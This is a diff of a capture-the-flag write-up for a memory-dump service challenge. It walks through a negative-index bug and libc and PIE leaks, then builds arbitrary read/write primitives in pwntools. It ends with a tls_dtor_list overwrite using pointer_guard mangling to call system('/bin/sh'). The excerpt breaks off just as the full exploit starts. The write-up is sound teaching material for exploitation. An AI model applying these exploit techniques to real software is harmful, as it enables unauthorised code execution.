@@ -323,7 +323,10 @@ int main() {
 }
 ```
 
-This challenge provides a memory dump management service with a menu-driven interface. You can create up to 0x41 (65) dumps, each with a maximum size of 0x4141 (16705) bytes, stored in the dumps array. The available features include:
+This challenge provides a memory dump management service with a menu interface. 
+You can create up to 0x41 (65) dumps, each with a maximum size of 0x4141 (16705) bytes, stored in the dumps array. 
+
+The available features include:
 - Creating zero-initialized dumps
 - Viewing dumps in a hex format (similar to hexdump)
 - Modifying individual bytes
@@ -342,7 +345,7 @@ This challenge provides a memory dump management service with a menu-driven inte
     Stripped:   No
 ```
 
-The first bug we can spot is in this condition:
+The first bug we can spot is in this condition (which can be found in four different functions):
 ```c
 // functions: hexdump_dump, change_byte, resize_dump, remove_dump.
 int idx = ask_for_index();
@@ -352,9 +355,9 @@ if (idx == -1)
 ```
 
 This check only filters out the index `-1`, but what about other negative values like `-80`? 
-so lets see how can we use this to leak some memory addresses.
+so lets see how can we use it to leak some memory addresses.
 
-To demonstrate how this can leak memory, I chose the `change_byte()` function:
+Now lets demonstrate this bug on the `change_byte()` function:
 ```c
 void change_byte(void) {
     int idx = ask_for_index();
@@ -385,23 +388,10 @@ void change_byte(void) {
 
 This function asks for a dump index and verifies that the corresponding dump exists. Then it asks for a byte offset and ensures it's within the size limit. If it's not, it prints both the offset and the dump size.
 
-The trick here is to pass a negative index like `-80`, which accesses memory outside the bounds of the dumps array. Then, we pass an extremely large offset to trigger the print statement that leaks memory:
+The trick here is to pass a negative index like `-80`, which accesses memory outside the bounds of the dumps array. 
+Then, we pass an extremely large offset to trigger the print statement that leaks memory by printing the "maximum size" of the fake index:
 
 ```txt
-____    ____                         ________                                                      
-`MM'    `MM'                         `MMMMMMMb.                                                    
- MM      MM                           MM    `Mb                                                    
- MM      MM   ____  ____   ___        MM     MM ___   ___ ___  __    __  __ ____     ____  ___  __ 
- MM      MM  6MMMMb `MM(   )P'        MM     MM `MM    MM `MM 6MMb  6MMb `M6MMMMb   6MMMMb `MM 6MM 
- MMMMMMMMMM 6M'  `Mb `MM` ,P          MM     MM  MM    MM  MM69 `MM69 `Mb MM'  `Mb 6M'  `Mb MM69   
- MM      MM MM    MM  `MM,P           MM     MM  MM    MM  MM'   MM'   MM MM    MM MM    MM MM'    
- MM      MM MMMMMMMM   `MM.           MM     MM  MM    MM  MM    MM    MM MM    MM MMMMMMMM MM     
- MM      MM MM         d`MM.          MM     MM  MM    MM  MM    MM    MM MM    MM MM       MM     
- MM      MM YM    d9  d' `MM.         MM    .M9  YM.   MM  MM    MM    MM MM.  ,M9 YM    d9 MM     
-_MM_    _MM_ YMMMM9 _d_  _)MM_       _MMMMMMM9'   YMMM9MM__MM_  _MM_  _MM_MMYMMM9   YMMMM9 _MM_    
-                                                                          MM                       
-                                                                          MM                       
-                                                                         _MM_                      
 =========== DUMP MENU ===========
 1) Create a new dump
 2) Hexdump a dump
@@ -421,13 +411,14 @@ _MM_    _MM_ YMMMM9 _d_  _)MM_       _MMMMMMM9'   YMMM9MM__MM_  _MM_  _MM_MMYMMM
 ==>
 ```
 
-Here, 140737353750400 is a leaked address. 
-Checking its memory space reveals that it's within libc, specifically:
+Here, `140737353750400` is a leaked address. 
+Checking from which memory space is it reveals that it's within libc:
 ![libc leak](/assets/images/ctf-writeups/BTS2025/libc-leak.png)
 ![leak symbol](/assets/images/ctf-writeups/BTS2025/leak-symbol.png)
 
-So we can see that this is a libc address pointing to the _IO_2_1_stdout_ object.
-Now let's write that in our pwntools exploit:
+So we can see that this libc address pointing to the `_IO_2_1_stdout_` struct.
+
+Let's write that in our pwntools exploit:
 ```py
 def leak_libc(p: process):
     send_option(p, "3")
@@ -439,11 +430,10 @@ def leak_libc(p: process):
     return libc
 ```
 
-Our next goal is to achieve arbitrary read/write.
-To do that, we need to either leak the PIE base or find a negative index that lets us overwrite the dump buffer’s pointer. That would allow us to read from or write to any address.
+Our next goal after leaking an address is to achieve `arbitrary operation read / write`.
+To do so, in our case we need to get `PIE base address` and find a negative index that lets us overwrite the dump buffer’s pointer, and that would allow us to read from or write to any address.
 
-I found that the dump buffer for index `-259` contains its own address (loop pointer).
-We can leak it or overwrite its first byte to make it point to any PIE address we want.
+I found that the dump buffer for index `-259` contains its own address on the `.BSS section` (loop pointer), so we can both use it to leak `PIE` and overwrite it with any other address we want.
 
 Here’s the function that leaks that index:
 ```py
@@ -457,9 +447,9 @@ def leak_bss(p: process):
     return bss
 ```
 
-Now we have two leaks: one for libc and one for the BSS section, and we also have the ability to perform arbitrary reads and writes to both libc and PIE addresses.
+Now we have two leaks: one for `libc` and one for the `PIE` (which can be calculated from the `.BSS section` leak), and we also have `arbitrary read & write` wich can be used both on libc and PIE addresses.
 
-So let’s implement the arbitrary write function:
+So firstly let’s implement the arbitrary write function:
 ```py
 def arbitrary_write(p: process, addr: int, data: int):
     idx = -191
@@ -470,9 +460,10 @@ def arbitrary_write(p: process, addr: int, data: int):
     for b in range(8):
         change_byte(p, idx, b, (data >> (b * 8)) & 0xff)
 ```
-This function first edits the address pointed to by our BSS leak, then writes data to that address.
 
-We can also use the same primitive for arbitrary read. 
+This function first edits the address pointed to by our `.BSS leak`, then writes data to that address.
+
+We can also use the same primitive for `arbitrary read`. 
 We'll use the `hexdump_dump` feature to read and print memory at any given address:
 ```py
 def arbitrary_read(p: process, addr: int):
@@ -487,18 +478,20 @@ def arbitrary_read(p: process, addr: int):
     return res
 ```
 
-Now that we have strong read/write primitives, we can build our exploit.
-The glibc version is 2.35, so we can't overwrite `__malloc_hook` / `__realloc_hook` / `__free_hook` because they’ve been removed or protected.
+#Exploit
+Now that we have that leaks & arbitrary read & write functions, we can start build our exploit!
 
+The Glibc version is `2.35`, so we can't overwrite `__malloc_hook` / `__realloc_hook` / `__free_hook` because they’ve been removed or protected on that newer Glibces.
 Instead, we can use a another trick: overwrite the `tls_dtor_list`, which stores function pointers that get called when the program exits.
-so it goes like this:
 
-1. Leak the pointer_guard (relative to libc).
-2. XOR it with the address of the function we want to run (e.g., `system()`).
-3. Rotate the result right (ROL encryption) as required by glibc's protection.
-4. Write the parameter for the function (like the address of `/bin/sh`) after the function pointer.
+so it goes like this:
+1. Leak the `pointer_guard` (relative to libc).
+2. XOR it with the address of the function we want to run (e.g. `system()`).
+3. Rotate the result (ROL encryption) as required by the `tls_call_dtors` function.
+4. Write the parameter for the function (e.g. the address of `/bin/sh\0` symbol).
 5. Overwrite the first entry in the `tls_dtor_list`.
-6. Trigger an exit to run our payload.
+6. Trigger an exit.
+7. Payload is runing...
 
 Here's the pwntools code for that:
 ```py
@@ -509,11 +502,12 @@ Here's the pwntools code for that:
     func ^= p_guard
     func = rol(func, 0x11, word_size=64)
 
+    # Build the tls_dotr struct in known address
     arbitrary_write(p, bss + 0x20, func)
     arbitrary_write(p, bss + 0x28, libc + BINSH)
 ```
 
-And here’s the complete exploit:
+The complete exploit:
 ```py
 from pwn import *
 
